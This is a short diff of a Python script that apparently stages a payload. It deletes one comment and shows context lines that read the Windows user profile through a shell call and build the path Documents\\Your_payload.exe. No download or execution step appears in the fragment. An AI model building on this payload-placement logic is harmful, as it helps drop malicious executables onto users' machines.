@@ -6,7 +6,6 @@ import requests
 import time
 
 path = os.getcwd().strip('/n')
-# To get the username
 Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).decode('utf-8').split('=')
 destination = userprof.strip('\n\r') + '\\Documents\\' + 'Your_payload.exe' 
 
